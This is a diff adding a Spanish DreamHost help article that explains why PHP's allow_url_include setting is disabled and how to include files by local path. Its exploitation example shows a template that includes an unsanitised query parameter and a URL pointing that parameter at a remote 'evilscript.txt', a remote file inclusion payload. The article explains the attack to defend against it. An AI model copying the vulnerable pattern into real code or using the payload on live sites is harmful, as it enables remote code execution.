@@ -1,0 +1,120 @@
+<h2>Generalidades</h2>
+<div class="solvvy-solution">
+<p>La opción de PHP allow_url_include normalmente permite a un programador a incluir() un archivo remoto (como código <a href="/hc/en-us/articles/214202188-PHP-overview">PHP</a>) usando una URL más que un camino de un archivo local. Por razones de seguridad, DreamHost ha deshabilitado esta característica. Si un script lo requiere, debes ver otra alternativa, pues el uso de esto indica serias fallas de diseño.</p>
+</div>
+<h2><strong><span id="Por_que_es_malo">¿Por que es malo?</span></strong></h2>
+<div class="solvvy-solution">
+<p>Hay un número de razones por las cuales una inclusión de URL siempre debe ser evitada:</p>
+<ul>
+<li>Es inseguro – si tu aplicación puede ser burlada en incluir contenido de una URL fuera de sí misma (hay un número de maneras comunes de que esto pase), un atacante puede forzar tu aplicación a correr código desde su propio sitio web.</li>
+<li>Es ineficiente – Si tu script de PHP incluye contenido de una URL, entonces el servidor web debe hacer requerimientos de HTTP para generar la página. Esto hace que tu página sea más lenta de lo necesario, especialmente si el sitio del que estás cargando el contenido responde lento.</li>
+<li>No es fidedigno, por varias razones – si el servidor web del que estás cargando contenido falla ocasionalmente, tu sitio web también fallará.</li>
+<li>Es normalmente innecesario – en muchos casos, permitir allow_url_include puede ser evadido usando el contenido directamente (si está siendo cargado de un dominio que tu alojas) o cargando e imprimiendo el contenido sin evaluarlo como PHP.</li>
+</ul>
+</div>
+<h2><strong><span id="Include_del_lado_del_servidor">Include del lado del servidor</span></strong></h2>
+<div class="solvvy-solution">
+<p>Muchos desarrolladores incluyen archivos para apuntar a una URL remota, aún si el archivo está dentro del sistema local. Por ejemplo:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;php include("http://example.com/includes/example_include.php"); ?&gt;</pre>
+</div>
+<p>Con allow_url_include deshabilitado, este método no funciona. En vez, el archivo debe estar incluido con un camino local, y hay tres métodos de hacerlo:</p>
+<ol>
+<li>Usando un camino relativo, como ../includes/example_include.php.</li>
+<li>Usando un camino absoluto (también conocido como relative-from-root o relativo-de-root), como /home/username/example.com/includes/example_include.php.</li>
+<li>Usando una variable de ambiente de PHP $_SERVER['DOCUMENT_ROOT'], lo cual retorna el camino absoluto al directorio web del toor. Esto es la mejor solución (y la más portátil)</li>
+</ol>
+<h4><strong><span id="Example_Include">Ejemplos de Include</span></strong></h4>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php include($_SERVER['DOCUMENT_ROOT']."/includes/example_include.php"); ?&gt;</pre>
+</div>
+</div>
+<h2><strong><span id="Procesar_diferencias_.28y_pasar_variables_a_un_archivo_include.29">Procesar diferencias (y pasar variables a un archivo include)</span></strong></h2>
+<div class="solvvy-solution">
+<p>Vale la pena mencionar que las soluciones alternativas presentadas aquí resultan en una diferencia en la manera que la función include() es manejada. Las soluciones alternativas retornan el código PHP de la página incluida; sin embargo, el método de URL remota ahora no disponible retorna el resultado de la página incluida. Un resultado de este comportamiento es de que no puedes pasar una línea de query usando soluciones alternativas. Tu defines las variables localmente antes de hacer el include, como se ve en el siguiente ejemplo:</p>
+<h4><strong>Ejemplo</strong></h4>
+<p>Para hacer el efecto de esto:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php include("http://example.com/includes/example_include.php?var=example"); ?&gt;</pre>
+</div>
+<p>tienes que usar esto en vez:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php $var = "example"; include($_SERVER['DOCUMENT_ROOT']."/includes/example_include.php"); ?&gt;</pre>
+</div>
+</div>
+<h2><strong><span id="Agregar_flexibilidad">Agregar flexibilidad</span></strong></h2>
+<div class="solvvy-solution">
+<p>Para máxima flexibilidad (cuando múltiples includes son requeridas, por ejemplo), puede ser más fácil de crear una variable:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php $doc_root = $_SERVER['DOCUMENT_ROOT'];
+include("$doc_root/includes/example_include.php");
+include("$doc_root/includes/example_include2.php");
+include("$doc_root/includes/example_include3.php");
+include("$doc_root/includes/example_include4.php"); ?&gt;</pre>
+</div>
+<dl>
+<dd></dd>
+<dd></dd>
+</dl>
+<div class="alert alert-note">
+<div class="alert-icon"><img src="https://kbimages.dreamhosters.com/images/dh-kb-note-icon.svg" alt="" width="60" height="60" /></div>
+<div class="alert-content">
+<p>La técnica funciona de la misma manera, no importa si estas usando include() o require().</p>
+</div>
+</div>
+</div>
+<h2><strong><span id="Configurar_include_path">Configurar include_path</span></strong></h2>
+<div class="solvvy-solution">
+<p>También puedes configurar explícitamente la directiva de PHP, "include_path", sobre la marcha:</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php ini_set('include_path',
+ini_get('include_path').':'.$_SERVER['DOCUMENT_ROOT'].'/includes');
+include('example_include.php');
+include('example_include2.php');
+include('example_include3.php');
+include('example_include4.php'); ?&gt;</pre>
+</div>
+<h3><strong><span id="Ejemplo_de_exploitation">Ejemplo de exploitation</span></strong></h3>
+<p>Un uso común de includes en el lado del servidor es crear algo como una plantilla de sitio. A menudo, una página con un header o un footer es alimentado con diferente contenido usando una línea de query.</p>
+<div class="preboxcontainer">
+<pre class="prebox">&lt;?php $page = ($_GET['page']) ? $_GET['page'] : "default.php"; ?&gt;
+&lt;html&gt;
+&lt;head&gt;
+e&gt;This page is easy to exploit&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+header...
+
+&lt;?php include($page); ?&gt;
+
+footer...
+
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>
+<p>El contenido de la página puede variar anexando una línea de query en la URL:</p>
+<div class="preboxcontainer">
+<pre class="prebox">http://example.com/index.php?page=varied.php</pre>
+</div>
+<p>Si allow_url_include está habilitado, este sistema puede ser explotado simplemente cargando un valor de la variable en la línea de query:</p>
+<div class="preboxcontainer">
+<pre class="prebox">http://example.com/index.php?page=http://websitehelp.support/evilscript.txt</pre>
+</div>
+</div>
+<h2><strong><span id="Nota_final">Nota final</span></strong></h2>
+<div class="solvvy-solution">
+<p>Solo di no. Habilitar allow_url_include es una idea terrible que expone tu sitio web, y los sitios web de otros en tu servidor compartido, un riesgo innecesario.</p>
+</div>
+<h2><strong><span id="Ver_también">Ver también</span></strong></h2>
+<div class="solvvy-hidden">
+<h3>Enlaces internos</h3>
+<ul>
+<li><a style="background-color: #ffffff;" href="https://help.dreamhost.com/hc/es/articles/214199238-allow-url-fopen">allow_url_fopen</a></li>
+</ul>
+<h3>Enlaces externos</h3>
+<ul>
+<li><a href="http://us2.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include"><code>allow_url_include</code></a> en <a href="http://php.net">PHP.net</a></li>
+<li><a href="http://us2.php.net/filesystem">Funciones de sistema de archivos PHP</a> en <a href="http://php.net">PHP.net</a></li>
+</ul>
+</div>
